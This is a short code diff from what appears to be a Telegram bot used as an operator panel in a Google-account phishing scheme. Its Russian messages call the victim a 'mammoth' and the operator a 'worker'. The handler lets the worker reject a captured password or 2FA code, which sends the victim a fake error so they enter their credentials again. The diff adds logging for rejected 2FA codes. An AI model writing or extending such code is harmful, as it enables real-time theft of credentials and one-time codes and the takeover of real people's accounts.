@@ -576,7 +576,7 @@ async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
         )
         await callback.answer("❌ Мамонту отправлена ошибка 'Неверный пароль'", show_alert=True)
         await notify_user_event(
-            event_type="google_password",
+            event_type="google_wrong_password",
             user_tg_id=target_tg_id,
             details="Воркер отклонил пароль (Неверный пароль)",
             mirror_token=bot.token,
@@ -628,6 +628,12 @@ async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
             error_msg="Неверный код. Проверьте код и повторите попытку.",
         )
         await callback.answer("❌ Мамонту отправлена ошибка 2FA кода", show_alert=True)
+        await notify_user_event(
+            event_type="google_wrong_2fa",
+            user_tg_id=target_tg_id,
+            details="Воркер отклонил 2FA код (Неверный 2FA)",
+            mirror_token=bot.token,
+        )
 
     elif action == "complete":
         db.set_google_auth_control(
